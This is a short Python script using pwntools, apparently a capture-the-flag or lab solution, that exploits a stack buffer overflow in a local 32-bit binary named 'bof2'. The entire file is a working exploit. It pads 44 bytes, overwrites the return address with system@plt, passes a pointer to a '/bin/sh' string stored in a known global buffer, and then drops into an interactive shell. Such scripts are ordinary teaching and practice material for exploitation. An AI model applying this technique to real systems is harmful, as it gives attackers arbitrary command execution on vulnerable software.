from pwn import *
context(os='linux', arch='i386')

filename='bof2'
p = process("./"+filename)
elf=ELF(filename)

buffer=0x804a060

system_plt=elf.plt['system']

payload=''
payload+='A'*44
payload+=p32(system_plt)
payload+="junk"
payload+=p32(buffer+44+12)
payload+='/bin/sh\x00'

p.sendline(payload)

p.interactive()
